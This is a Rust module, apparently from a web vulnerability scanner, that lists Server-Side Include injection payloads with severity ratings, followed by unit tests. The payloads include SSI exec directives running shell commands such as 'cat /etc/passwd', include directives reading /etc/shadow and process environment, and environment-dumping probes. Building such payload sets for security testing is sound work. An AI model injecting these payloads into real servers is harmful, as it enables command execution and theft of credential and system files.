use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Ssi,
        "command-execution", [
            ("<!--#exec cmd=\"id\"-->", "SSI exec - run id", Severity::Critical),
            ("<!--#exec cmd=\"whoami\"-->", "SSI exec - whoami", Severity::Critical),
            ("<!--#exec cmd=\"cat /etc/passwd\"-->", "SSI exec - read passwd", Severity::Critical),
            ("<!--#exec cmd=\"uname -a\"-->", "SSI exec - system info", Severity::Critical),
        ];
        "file-inclusion", [
            ("<!--#include virtual=\"/etc/passwd\"-->", "SSI include virtual - passwd", Severity::Critical),
            ("<!--#include virtual=\"/etc/shadow\"-->", "SSI include virtual - shadow", Severity::Critical),
            ("<!--#include file=\"/etc/passwd\"-->", "SSI include file - passwd", Severity::Critical),
            ("<!--#include virtual=\"/proc/self/environ\"-->", "SSI include - process env", Severity::Critical),
        ];
        "variable-disclosure", [
            ("<!--#echo var=\"DOCUMENT_ROOT\"-->", "SSI echo - document root", Severity::High),
            ("<!--#echo var=\"SERVER_NAME\"-->", "SSI echo - server name", Severity::Medium),
            ("<!--#echo var=\"REMOTE_ADDR\"-->", "SSI echo - remote addr disclosure", Severity::Medium),
            ("<!--#echo var=\"HTTP_USER_AGENT\"-->", "SSI echo - user agent disclosure", Severity::Low),
            ("<!--#printenv -->", "SSI printenv - dump all env vars", Severity::Critical),
        ];
        "config", [
            ("<!--#config timefmt=\"%d\"-->", "SSI config - timefmt manipulation", Severity::Medium),
            ("<!--#config sizefmt=\"bytes\"-->", "SSI config - sizefmt", Severity::Low),
            ("<!--#config errmsg=\"injected\"-->", "SSI config - error message injection", Severity::Medium),
        ];
        "conditional", [
            ("<!--#if expr=\"\\\"foo\\\" = \\\"foo\\\"\"-->matched<!--#endif-->", "SSI if - string equality", Severity::High),
            ("<!--#if expr=\"$REMOTE_ADDR = \\\"127.0.0.1\\\"\"-->admin<!--#endif-->", "SSI if - REMOTE_ADDR match", Severity::High),
        ];
        "set", [
            ("<!--#set var=\"x\" value=\"injected\"-->", "SSI set - variable assignment", Severity::Medium),
            ("<!--#set var=\"cmd\" value=\"id\"-->", "SSI set - command name variable", Severity::High),
        ]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        assert!(!get_payloads().is_empty());
    }

    #[test]
    fn all_payloads_are_ssi_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Ssi);
        }
    }

    #[test]
    fn minimum_payload_count() {
        assert!(
            get_payloads().len() >= 10,
            "Must have substantial SSI payload coverage"
        );
    }

    #[test]
    fn contains_exec_directive() {
        assert!(get_payloads().iter().any(|p| p.payload.contains("#exec cmd=")));
    }

    #[test]
    fn contains_include_directive() {
        assert!(get_payloads().iter().any(|p| p.payload.contains("#include")));
    }

    #[test]
    fn contains_echo_directive() {
        assert!(get_payloads().iter().any(|p| p.payload.contains("#echo var=")));
    }
}
